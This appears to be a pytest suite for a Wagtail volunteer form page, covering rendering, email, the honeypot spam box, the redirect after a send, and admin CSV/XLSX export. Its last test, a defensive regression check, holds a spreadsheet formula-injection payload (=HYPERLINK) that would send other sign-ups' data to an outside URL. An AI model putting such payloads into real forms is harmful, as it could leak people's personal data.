import io

import pytest
from bs4 import BeautifulSoup
from django.apps import apps
from django.core import mail
from django.core.cache import caches
from django.template.loader import get_template
from django.urls import reverse
from openpyxl import load_workbook
from wagtail.contrib.forms.models import AbstractFormField, FormSubmission

from contact.models import EmailFormPage, FormField, FormPage
from core.models import SiteSettings
from home.models import StandardPage

pytestmark = pytest.mark.django_db


@pytest.fixture
def volunteer_form(home_page, privacy_notice):
    page = FormPage(
        title="Volunteer with us",
        slug="volunteer",
        intro="<p>Give a few hours a month.</p>",
        thank_you_text="<p>Thanks! Our volunteer team will be in touch.</p>",
        to_address="volunteers@brightwell.example",
        from_address="website@brightwell.example",
        subject="New volunteer sign-up",
    )
    page.form_fields = [
        FormField(label="Your name", field_type="singleline", required=True),
        FormField(label="Email address", field_type="email", required=True),
        FormField(
            label="Availability",
            field_type="dropdown",
            choices="Weekdays\nWeekends",
            required=False,
        ),
    ]
    home_page.add_child(instance=page)
    page.save_revision().publish()
    return page


VALID_DATA = {"your_name": "Sam", "email_address": "sam@example.com", "availability": "Weekends"}


class TestPageTreeRules:
    def test_forms_can_live_under_home_or_standard_pages(self, home_page):
        about = StandardPage(title="Get involved")
        home_page.add_child(instance=about)

        assert FormPage.can_create_at(home_page)
        assert FormPage.can_create_at(about)

    def test_every_form_page_type_has_its_own_fields_and_templates(self):
        """EmailFormPage can't hold a field model or templates for its types (#167): each type
        declares a field model with related_name="form_fields", and its own two templates."""
        form_types = [
            model
            for model in apps.get_models()
            if issubclass(model, EmailFormPage) and not model._meta.abstract
        ]
        assert form_types
        for model in form_types:
            fields = model._meta.get_field("form_fields")
            assert issubclass(fields.related_model, AbstractFormField), model.__name__
            page = model()
            get_template(page.template)
            get_template(page.landing_page_template)


class TestFormPage:
    def test_renders_intro_and_editor_defined_fields(self, client, volunteer_form):
        html = client.get(volunteer_form.url).content.decode()

        assert "Give a few hours a month." in html
        assert 'name="your_name"' in html
        assert 'name="email_address"' in html
        assert "Weekends" in html

    def test_links_to_the_privacy_notice_before_the_send_button(
        self, client, volunteer_form, privacy_notice
    ):
        html = client.get(volunteer_form.url).content.decode()
        form = BeautifulSoup(html, "html.parser").find("form", method="post")
        link = form.find("a", string="How we use your details")

        assert link["href"] == privacy_notice.url
        assert link.find_next("button", type="submit") is not None

    def test_no_privacy_link_without_a_privacy_notice(self, client, volunteer_form, site):
        """The form can't go live before a notice is chosen (#175), so the choice is cleared
        after."""
        settings = SiteSettings.for_site(site)
        settings.privacy_page = None
        settings.save()

        assert "How we use your details" not in client.get(volunteer_form.url).content.decode()

    def test_valid_submission_is_stored_and_shows_thank_you(self, client, volunteer_form):
        response = client.post(volunteer_form.url, VALID_DATA, follow=True)

        assert response.status_code == 200
        assert "Our volunteer team will be in touch." in response.content.decode()
        submission = FormSubmission.objects.get(page=volunteer_form)
        assert submission.form_data["your_name"] == "Sam"

    def test_valid_submission_emails_the_team_with_reply_to_the_sender(
        self, client, volunteer_form
    ):
        client.post(volunteer_form.url, VALID_DATA)

        assert len(mail.outbox) == 1
        message = mail.outbox[0]
        assert message.to == ["volunteers@brightwell.example"]
        assert message.subject == "New volunteer sign-up"
        assert message.reply_to == ["sam@example.com"]
        assert "Your name: Sam" in message.body

    def test_submission_is_kept_and_thanked_when_the_mail_server_is_down(
        self, client, volunteer_form, monkeypatch, caplog
    ):
        def mail_server_down(*args, **kwargs):
            raise ConnectionRefusedError("[Errno 111] Connection refused")

        monkeypatch.setattr("contact.models.send_mail", mail_server_down)

        response = client.post(volunteer_form.url, VALID_DATA, follow=True)

        assert response.status_code == 200
        assert "Our volunteer team will be in touch." in response.content.decode()
        assert FormSubmission.objects.filter(page=volunteer_form).exists()
        assert "Could not email the submission" in caplog.text

    def test_invalid_submission_shows_errors_and_stores_nothing(self, client, volunteer_form):
        response = client.post(volunteer_form.url, {"your_name": "Sam"})

        assert response.status_code == 200
        assert "This field is required." in response.content.decode()
        assert not FormSubmission.objects.exists()
        assert mail.outbox == []


class TestAfterASend:
    """A send goes on to ?sent (#167), so reloading the thank-you can't send it twice."""

    def test_a_valid_send_goes_on_to_sent(self, client, volunteer_form):
        response = client.post(volunteer_form.url, VALID_DATA)

        assert response.status_code == 303
        assert response["Location"] == f"{volunteer_form.url}?sent"

    def test_a_filled_hidden_box_goes_on_to_sent_too(self, client, volunteer_form):
        """A script sees what a person sees, so it can't tell its send was dropped."""
        response = client.post(volunteer_form.url, {**VALID_DATA, "hp-leave-blank": "x"})

        assert response.status_code == 303
        assert response["Location"] == f"{volunteer_form.url}?sent"

    def test_opening_sent_shows_thanks_and_keeps_and_sends_nothing(self, client, volunteer_form):
        response = client.get(f"{volunteer_form.url}?sent")

        assert response.status_code == 200
        assert "Our volunteer team will be in touch." in response.content.decode()
        assert not FormSubmission.objects.exists()
        assert mail.outbox == []

    def test_goes_on_to_the_address_it_was_sent_to(self, client, volunteer_form, monkeypatch):
        """Not the page's own URL, which is None when no site routes to it."""
        monkeypatch.setattr(FormPage, "get_url", lambda self, request=None: None)

        response = client.post(f"{volunteer_form.url}?utm_source=newsletter", VALID_DATA)

        assert response["Location"] == f"{volunteer_form.url}?sent"

    def test_the_landing_preview_still_shows_the_thanks(self, rf, volunteer_form):
        response = volunteer_form.serve_preview(rf.get("/"), "landing")

        assert response.status_code == 200
        assert "Our volunteer team will be in touch." in response.render().content.decode()


class TestTheHiddenBox:
    """A script that fills every box (#104) sees the thank-you, and nothing is kept or sent."""

    def test_the_form_has_the_box(self, client, volunteer_form):
        html = client.get(volunteer_form.url).content.decode()
        form = BeautifulSoup(html, "html.parser").find("form", method="post")

        assert form.find("input", attrs={"name": "hp-leave-blank"}) is not None

    def test_filled_shows_thanks_and_keeps_and_sends_nothing(self, client, volunteer_form, caplog):
        response = client.post(
            volunteer_form.url,
            {**VALID_DATA, "hp-leave-blank": "Buy cheap watches"},
            REMOTE_ADDR="203.0.113.7",
            follow=True,
        )

        assert response.status_code == 200
        assert "Our volunteer team will be in touch." in response.content.decode()
        assert not FormSubmission.objects.exists()
        assert mail.outbox == []
        assert str(volunteer_form.pk) in caplog.text
        for private in ("Buy cheap watches", "sam@example.com", "203.0.113.7"):
            assert private not in caplog.text

    def test_filled_is_dropped_when_the_cache_is_broken(self, client, volunteer_form, monkeypatch):
        def broken(*args, **kwargs):
            raise OSError("disk full")

        monkeypatch.setattr(caches["limits"], "add", broken)

        response = client.post(
            volunteer_form.url, {**VALID_DATA, "hp-leave-blank": "x"}, follow=True
        )

        assert response.status_code == 200
        assert not FormSubmission.objects.exists()

    def test_an_empty_box_sends_as_before(self, client, volunteer_form):
        client.post(volunteer_form.url, {**VALID_DATA, "hp-leave-blank": ""})

        assert FormSubmission.objects.filter(page=volunteer_form).exists()
        assert len(mail.outbox) == 1


class TestSubmissionsInTheAdmin:
    def test_editors_can_view_submissions(self, admin_client, client, volunteer_form):
        client.post(volunteer_form.url, VALID_DATA)

        url = reverse("wagtailforms:list_submissions", args=[volunteer_form.pk])
        response = admin_client.get(url)

        assert response.status_code == 200
        assert "sam@example.com" in response.content.decode()

    def test_editors_can_export_submissions_as_csv(self, admin_client, client, volunteer_form):
        client.post(volunteer_form.url, VALID_DATA)

        url = reverse("wagtailforms:list_submissions", args=[volunteer_form.pk])
        response = admin_client.get(url, {"export": "csv"})

        assert response["Content-Type"].startswith("text/csv")
        assert "sam@example.com" in b"".join(response.streaming_content).decode()

    def test_the_hidden_box_is_never_a_column(self, admin_client, client, volunteer_form):
        client.post(volunteer_form.url, {**VALID_DATA, "hp-leave-blank": ""})

        url = reverse("wagtailforms:list_submissions", args=[volunteer_form.pk])
        header = b"".join(admin_client.get(url, {"export": "csv"}).streaming_content)

        assert "hp-leave-blank" not in header.decode().splitlines()[0]

    # Regression: ISSUE-003 — a sign-up "named" =HYPERLINK(…) was exported as a live formula,
    # which could send the other sign-ups away when opened. Found by /qa on 2026-10-12.
    @pytest.mark.parametrize("export", ["csv", "xlsx"])
    def test_export_shows_a_formula_typed_by_a_visitor_as_text(
        self, admin_client, client, volunteer_form, export
    ):
        formula = '=HYPERLINK("https://example.org/?d="&C2,"Open")'
        client.post(volunteer_form.url, {**VALID_DATA, "your_name": formula})

        url = reverse("wagtailforms:list_submissions", args=[volunteer_form.pk])
        content = b"".join(admin_client.get(url, {"export": export}).streaming_content)

        if export == "csv":
            assert f"'{formula}".replace('"', '""') in content.decode()
        else:
            cells = [cell for row in load_workbook(io.BytesIO(content)).active for cell in row]
            assert [cell.data_type for cell in cells if cell.value == formula] == ["s"]
